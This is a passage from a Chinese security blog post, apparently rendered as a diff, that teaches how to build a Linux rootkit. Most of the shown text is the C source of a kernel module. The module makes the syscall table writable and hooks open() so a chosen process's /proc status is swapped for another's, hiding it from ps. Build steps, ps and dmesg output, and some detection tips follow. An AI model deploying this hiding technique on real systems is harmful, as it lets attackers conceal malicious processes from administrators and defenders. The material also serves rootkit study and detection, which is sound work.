class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;asm/unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;asm/cacheflush.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/syscalls.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;asm/pgtable_types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/highmem.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/fs.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/moduleparam.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/unistd.h&gt;</span></span></span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;GPL&quot;</span>);</span><br><span class="line">MODULE_AUTHOR(<span class="string">&quot;BruceFan&quot;</span>);</span><br><span class="line"><span class="comment">/* My sys_call_table address */</span></span><br><span class="line"><span class="comment">/* c16f71c0 R sys_call_table */</span></span><br><span class="line"><span class="keyword">void</span> **system_call_table_addr;</span><br><span class="line"></span><br><span class="line"><span class="function">asmlinkage <span class="title">int</span> <span class="params">(*original_open)</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *pathname, <span class="keyword">int</span> flags)</span></span>;</span><br><span class="line"><span class="function">asmlinkage <span class="keyword">int</span> <span class="title">open_hijack</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *pathname, <span class="keyword">int</span> flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">/* This hooks all OPEN sys calls and check to see what the path of the file being opened is.</span></span><br><span class="line"><span class="comment">     * Currently, the paths must be hard coded for the process you wish to hide, and the process you would like it to impersonate. */</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strstr</span>(pathname, <span class="string">&quot;/proc/5874/status&quot;</span>) != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        printk(KERN_ALERT <span class="string">&quot;PS PROCESS HIJACKED %s\n&quot;</span>, pathname);</span><br><span class="line">        <span class="comment">/* The new process location will be written into the syscall table for the open command,</span></span><br><span class="line"><span class="comment">         * causing it to open a different file than the one originaly requested. */</span></span><br><span class="line">        <span class="built_in">memcpy</span>(pathname, <span class="string">&quot;/proc/5882/status&quot;</span>, <span class="built_in">strlen</span>(pathname)+<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> (*original_open)(pathname, flags);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* Make page writeable */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">make_rw</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> address)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> level;</span><br><span class="line">    <span class="keyword">pte_t</span> *pte = lookup_address(address, &amp;level); <span class="comment">/* pte points to the beginning address of a page table */</span></span><br><span class="line">    <span class="keyword">if</span> (pte-&gt;pte &amp; ~_PAGE_RW) &#123;</span><br><span class="line">        pte-&gt;pte |= _PAGE_RW;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* Make the page write protected */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">make_ro</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> address)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> level;</span><br><span class="line">    <span class="keyword">pte_t</span> *pte = lookup_address(address, &amp;level);</span><br><span class="line">    pte-&gt;pte = pte-&gt;pte &amp; ~_PAGE_RW;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> __init <span class="title">start</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">/* My sys_call_table address */</span></span><br><span class="line">    system_call_table_addr = (<span class="keyword">void</span> *)<span class="number">0xc16f71c0</span>;</span><br><span class="line">    <span class="comment">/* return the system call to its original state */</span></span><br><span class="line">    original_open = system_call_table_addr[__NR_open];</span><br><span class="line">    <span class="comment">/* Disable page protection */</span></span><br><span class="line">    make_rw((<span class="keyword">unsigned</span> <span class="keyword">long</span>)system_call_table_addr);</span><br><span class="line">    <span class="comment">/* Change syscall to our syscall function */</span></span><br><span class="line">    system_call_table_addr[__NR_open] = open_hijack;</span><br><span class="line">    printk(KERN_INFO <span class="string">&quot;Open psHook loaded successfully..\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> __exit <span class="title">end</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">/* Restore original system call */</span></span><br><span class="line">    system_call_table_addr[__NR_pname] = original_open;</span><br><span class="line">    <span class="comment">/* Renable page protection */</span></span><br><span class="line">    make_ro((<span class="keyword">unsigned</span> <span class="keyword">long</span>)system_call_table_addr);</span><br><span class="line">    printk(KERN_INFO <span class="string">&quot;Unloaded Captain Hook Successfully\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module_init(start);</span><br><span class="line">module_exit(end);</span><br></pre></td></tr></table></figure>
+<p>复制前面使用的Makefile，同时将顶部的”captainHook.o”替换为“phide.o”，用make命令编译。<br>将phide模块插入内核前：  </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># ps</span><br><span class="line">  PID TTY         TIME CMD</span><br><span class="line"> 5874 pts&#x2F;2   00:00:00 su</span><br><span class="line"> 5882 pts&#x2F;2   00:00:00 bash</span><br><span class="line">17526 pts&#x2F;2   00:00:00 ps</span><br></pre></td></tr></table></figure>
+<p>将phide模块插入内核后：  </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># ps</span><br><span class="line">  PID TTY         TIME CMD</span><br><span class="line"> 5882 pts&#x2F;2   00:00:00 bash</span><br><span class="line"> 5882 pts&#x2F;2   00:00:00 bash</span><br><span class="line">17526 pts&#x2F;2   00:00:00 ps</span><br></pre></td></tr></table></figure>
+<p>实时查看dmesg的终端：  </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">Open psHook loaded successfully..</span><br><span class="line">PS PROCESS HIJACKED &#x2F;proc&#x2F;5874&#x2F;status</span><br></pre></td></tr></table></figure>
+<p>成功实现了隐身！除此之外，还可以用这个方法隐藏多个进程。</p>
+<h2 id="防御方法"><a href="#防御方法" class="headerlink" title="防御方法"></a>防御方法</h2><p>1.这里只是用另一个正在运行的进程来隐藏当前进程。所以在ps输出中会有重复的PID。很容易被发现，还有一些其他的方法可以完全隐藏它，在后面的rootkit文章中会进行介绍。<br>2.用lsmod可以查看内核上运行的模块：  </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ lsmod</span><br><span class="line">Module         Size  Used by</span><br><span class="line">phide           900  0</span><br></pre></td></tr></table></figure>
+<p>3.想查看所有模块，可以使用：  </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ cat &#x2F;proc&#x2F;modules</span><br></pre></td></tr></table></figure>
+<p>4.因为rootkits通常在内存中待命，所以最好使用一个可以主动寻找rootkit的程序，例如：  </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">kbeast – https:&#x2F;&#x2F;volatility-labs.blogspot.ca&#x2F;2012&#x2F;09&#x2F;movp-15-kbeast-rootkit-detecting-hidden.html</span><br><span class="line">chkroot – http:&#x2F;&#x2F;www.chkrootkit.org&#x2F;</span><br><span class="line">kernel check – http:&#x2F;&#x2F;la-samhna.de&#x2F;library&#x2F;kern_check.c</span><br></pre></td></tr></table></figure>
+<p><strong>reference</strong><br><a target="_blank" rel="noopener" href="http://bobao.360.cn/learning/detail/3337.html">http://bobao.360.cn/learning/detail/3337.html</a><br><a target="_blank" rel="noopener" href="https://d0hnuts.com/2016/12/21/basics-of-making-a-rootkit-from-syscall-to-hook/">https://d0hnuts.com/2016/12/21/basics-of-making-a-rootkit-from-syscall-to-hook/</a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2017/01/04/Rootkit%E6%8A%80%E6%9C%AF%EF%BC%88%E4%B8%80%EF%BC%89%E4%BB%8Esyscall%E5%88%B0hook/" data-id="ckhe7o4m7003ochl7b3wu926r" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Kernel/" rel="tag">Kernel</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2017/01/10/Android%E6%97%A0%E6%BA%90%E7%A0%81%E8%B0%83%E8%AF%95/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          Android无源码调试
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2016/12/26/%E6%A0%91%E8%8E%93%E6%B4%BE%E4%B8%8A%E7%BB%83%E4%B9%A0ARM-PWN/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">树莓派上练习ARM PWN</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/ARM/" rel="tag">ARM</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Algorithms/" rel="tag">Algorithms</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Android/" rel="tag">Android</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Blockchain/" rel="tag">Blockchain</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/C-C/" rel="tag">C/C++</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Crypto/" rel="tag">Crypto</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Docker/" rel="tag">Docker</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Fuzzing/" rel="tag">Fuzzing</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/IoT/" rel="tag">IoT</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Java/" rel="tag">Java</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Kernel/" rel="tag">Kernel</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Machine-Learning/" rel="tag">Machine Learning</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Pwn/" rel="tag">Pwn</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Reverse/" rel="tag">Reverse</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Symbolic-Execution/" rel="tag">Symbolic Execution</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Tensorflow/" rel="tag">Tensorflow</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Virtual/" rel="tag">Virtual</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/ARM/" style="font-size: 11px;">ARM</a> <a href="/tags/Algorithms/" style="font-size: 10px;">Algorithms</a> <a href="/tags/Android/" style="font-size: 20px;">Android</a> <a href="/tags/Blockchain/" style="font-size: 11px;">Blockchain</a> <a href="/tags/C-C/" style="font-size: 18px;">C/C++</a> <a href="/tags/Crypto/" style="font-size: 10px;">Crypto</a> <a href="/tags/Docker/" style="font-size: 10px;">Docker</a> <a href="/tags/Fuzzing/" style="font-size: 15px;">Fuzzing</a> <a href="/tags/IoT/" style="font-size: 12px;">IoT</a> <a href="/tags/Java/" style="font-size: 14px;">Java</a> <a href="/tags/Kernel/" style="font-size: 19px;">Kernel</a> <a href="/tags/Machine-Learning/" style="font-size: 17px;">Machine Learning</a> <a href="/tags/Pwn/" style="font-size: 19px;">Pwn</a> <a href="/tags/Reverse/" style="font-size: 13px;">Reverse</a> <a href="/tags/Symbolic-Execution/" style="font-size: 12px;">Symbolic Execution</a> <a href="/tags/Tensorflow/" style="font-size: 10px;">Tensorflow</a> <a href="/tags/Virtual/" style="font-size: 16px;">Virtual</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/07/">July 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/06/">June 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/05/">May 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/03/">March 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/02/">February 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/01/">January 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/11/">November 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">October 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/08/">August 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/07/">July 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/05/">May 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/07/">July 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/06/">June 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/05/">May 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/09/">September 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/08/">August 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/07/">July 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/06/">June 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/05/">May 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/04/">April 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/03/">March 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/02/">February 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/01/">January 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/12/">December 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/11/">November 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/10/">October 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/08/">August 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/07/">July 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/06/">June 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/05/">May 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/04/">April 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/03/">March 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/01/">January 2016</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2020/07/29/so%E6%96%87%E4%BB%B6%E7%9A%84-init-array%E6%AE%B5%E4%B8%AD%E6%B7%BB%E5%8A%A0%E4%BB%A3%E7%A0%81/">so文件的.init_array段中添加代码</a>
+          </li>
+        
+          <li>
+            <a href="/2020/07/09/PID-namespace/">PID namespace</a>
+          </li>
+        
+          <li>
+            <a href="/2020/07/08/Mount-namespace/">Mount namespace</a>
+          </li>
+        
+          <li>
+            <a href="/2020/07/06/User-namespace/">User namespace</a>
+          </li>
+        
+          <li>
+            <a href="/2020/07/01/UnionFS%E6%8A%80%E6%9C%AF/">UnionFS技术</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2020 John Doe<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+  
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+  </div>
+</body>
+</html>
